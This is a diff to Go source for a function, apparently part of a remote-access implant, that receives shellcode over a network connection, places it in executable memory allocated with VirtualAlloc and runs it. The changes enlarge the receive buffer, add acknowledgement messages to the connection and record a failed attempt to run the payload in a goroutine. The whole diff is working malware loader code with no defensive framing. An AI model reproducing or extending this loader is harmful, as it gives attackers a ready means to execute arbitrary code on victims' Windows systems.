@@ -10,17 +10,18 @@ import (
 )
 
 func barCodeLoad(conn *net.Conn) { //Works with x64 only.
+	buffer := make([]byte, 10000000)
+	(*conn).Write([]byte("OK\n"))
 	fmt.Println("Getting the shellcode")
-	buff := make([]byte, 100000)
-	read_len, err := (*conn).Read(buff)
+	read_len, err := (*conn).Read(buffer)
 	if read_len <= 1 {
 		fmt.Println("Failed to read shellcode")
 	}
 	if err != nil {
 		fmt.Println("Failed to read shellcode")
 	}
-	buffSnapped := buff[:read_len]
-	//strBuff := string(buffSnapped)
+	buffSnapped := buffer[:read_len]
+	(*conn).Write([]byte("OK\n"))
 	executableMemory, err := windows.VirtualAlloc(0, uintptr(len(buffSnapped)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
 	if err != nil {
 		log.Fatal("Fail allocating executable memory: ", err)
@@ -31,9 +32,11 @@ func barCodeLoad(conn *net.Conn) { //Works with x64 only.
 	memoryPtr := &executableMemory
 	ptr := unsafe.Pointer(&memoryPtr)
 	shellcodeFunc := *(*func())(ptr)
-	//Try to run this concurently with goroutine ?!
+	//Try to run this concurently with goroutine ?! Didnt work
+	// go func() {
+	// 	shellcodeFunc()
+	// }()
 	shellcodeFunc()
-
 }
 
 func WriteMemory(inbuf []byte, destination uintptr) {
